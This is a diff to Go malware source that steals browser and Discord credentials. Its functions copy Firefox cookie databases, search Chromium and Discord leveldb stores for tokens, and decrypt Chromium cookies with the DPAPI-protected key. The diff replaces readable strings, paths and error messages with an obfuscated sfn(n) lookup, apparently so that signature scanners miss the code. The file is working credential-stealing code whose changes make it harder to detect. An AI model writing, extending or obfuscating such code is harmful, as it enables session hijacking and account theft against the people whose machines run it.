@@ -305,21 +305,21 @@ func stealFirefoxCookies(profilesPath string, browserExe string) (string, []stri
 
 	entries, err := os.ReadDir(profilesPath)
 	if err != nil {
-		return "", []string{"firefox readdir: " + err.Error()}
+		return "", []string{"e4: " + err.Error()}
 	}
 
 	for _, e := range entries {
 		if !e.IsDir() {
 			continue
 		}
-		cookiePath := filepath.Join(profilesPath, e.Name(), "cookies.sqlite")
+		cookiePath := filepath.Join(profilesPath, e.Name(), sfn(3))
 		if _, err := os.Stat(cookiePath); os.IsNotExist(err) {
 			continue
 		}
 
 		tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("t%x_%d", rand.Intn(0xFFFF), time.Now().UnixNano()))
 		if err := copyFileLocked(cookiePath, tmpPath, browserExe); err != nil {
-			errs = append(errs, fmt.Sprintf("firefox/%s copy: %v", e.Name(), err))
+			errs = append(errs, fmt.Sprintf("e1/%s: %v", e.Name(), err))
 			continue
 		}
 		_ = copyFileLocked(cookiePath+"-wal", tmpPath+"-wal", browserExe)
@@ -330,7 +330,7 @@ func stealFirefoxCookies(profilesPath string, browserExe string) (string, []stri
 
 		db, err := sql.Open("sqlite", tmpPath)
 		if err != nil {
-			errs = append(errs, fmt.Sprintf("firefox/%s open: %v", e.Name(), err))
+			errs = append(errs, fmt.Sprintf("e2/%s: %v", e.Name(), err))
 			continue
 		}
 
@@ -338,7 +338,7 @@ func stealFirefoxCookies(profilesPath string, browserExe string) (string, []stri
 
 		rows, err := db.Query("SELECT host, name, path, value, expiry FROM moz_cookies")
 		if err != nil {
-			errs = append(errs, fmt.Sprintf("firefox/%s query: %v", e.Name(), err))
+			errs = append(errs, fmt.Sprintf("e3/%s: %v", e.Name(), err))
 			db.Close()
 			continue
 		}
@@ -623,19 +623,19 @@ func stealDiscordTokens() string {
 		}
 		app := filepath.Join(base, parts[1])
 		searchDirs = append(searchDirs, searchEntry{
-			leveldbDir:     filepath.Join(app, "Local Storage", "leveldb"),
-			localStatePath: filepath.Join(app, "Local State"),
+			leveldbDir:     filepath.Join(app, sfn(4), sfn(5)),
+			localStatePath: filepath.Join(app, sfn(6)),
 		})
 	}
 
-	profiles := []string{"Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5",
+	profiles := []string{sfn(7), sfn(8), sfn(9), sfn(10), sfn(11), sfn(12),
 		"Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"}
 	for _, subPath := range getDiscordBrowserPaths() {
 		base := filepath.Join(localAppdata, subPath)
 		for _, prof := range profiles {
 			searchDirs = append(searchDirs, searchEntry{
-				leveldbDir:     filepath.Join(base, prof, "Local Storage", "leveldb"),
-				localStatePath: filepath.Join(base, "Local State"),
+				leveldbDir:     filepath.Join(base, prof, sfn(4), sfn(5)),
+				localStatePath: filepath.Join(base, sfn(6)),
 			})
 		}
 	}
@@ -643,7 +643,7 @@ func stealDiscordTokens() string {
 	tokenSet := map[string]bool{}
 	var tokens []string
 
-	encPrefix := "dQw4w9WgXcQ:"
+	encPrefix := sfn(16)
 
 	for _, entry := range searchDirs {
 		files, err := os.ReadDir(entry.leveldbDir)
@@ -658,7 +658,7 @@ func stealDiscordTokens() string {
 
 		for _, f := range files {
 			ext := strings.ToLower(filepath.Ext(f.Name()))
-			if ext != ".ldb" && ext != ".log" {
+			if ext != sfn(19) && ext != sfn(20) {
 				continue
 			}
 			data, err := os.ReadFile(filepath.Join(entry.leveldbDir, f.Name()))
@@ -747,7 +747,7 @@ func isDiscordToken(s string) bool {
 	if len(s) < 50 {
 		return false
 	}
-	if strings.HasPrefix(s, "mfa.") && len(s) > 80 {
+	if strings.HasPrefix(s, sfn(18)) && len(s) > 80 {
 		for _, c := range s[4:] {
 			if !((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '-' || c == '_') {
 				return false
@@ -794,32 +794,32 @@ func decryptCookieValue(encValue []byte, userDataPath string) string {
 		return ""
 	}
 
-	if len(encValue) > 3 && string(encValue[:3]) == "v10" {
-		localStatePath := filepath.Join(userDataPath, "Local State")
+	if len(encValue) > 3 && string(encValue[:3]) == sfn(17) {
+		localStatePath := filepath.Join(userDataPath, sfn(6))
 		key := getChromiumKey(localStatePath)
 		if key == nil {
-			return "(encrypted)"
+			return sfn(21)
 		}
 		nonce := encValue[3:15]
 		ciphertext := encValue[15:]
 		block, err := aes.NewCipher(key)
 		if err != nil {
-			return "(encrypted)"
+			return sfn(21)
 		}
 		gcm, err := cipher.NewGCM(block)
 		if err != nil {
-			return "(encrypted)"
+			return sfn(21)
 		}
 		plain, err := gcm.Open(nil, nonce, ciphertext, nil)
 		if err != nil {
-			return "(encrypted)"
+			return sfn(21)
 		}
 		return string(plain)
 	}
 
 	out, err := dpapiDecrypt(encValue)
 	if err != nil {
-		return "(encrypted)"
+		return sfn(21)
 	}
 	return string(out)
 }
@@ -845,11 +845,11 @@ func getChromiumKey(localStatePath string) []byte {
 		return nil
 	}
 
-	osCrypt, ok := state["os_crypt"].(map[string]interface{})
+	osCrypt, ok := state[sfn(13)].(map[string]interface{})
 	if !ok {
 		return nil
 	}
-	encKeyB64, ok := osCrypt["encrypted_key"].(string)
+	encKeyB64, ok := osCrypt[sfn(14)].(string)
 	if !ok {
 		return nil
 	}
@@ -859,7 +859,7 @@ func getChromiumKey(localStatePath string) []byte {
 		return nil
 	}
 
-	if len(encKey) < 5 || string(encKey[:5]) != "DPAPI" {
+	if len(encKey) < 5 || string(encKey[:5]) != sfn(15) {
 		return nil
 	}
 	encKey = encKey[5:]
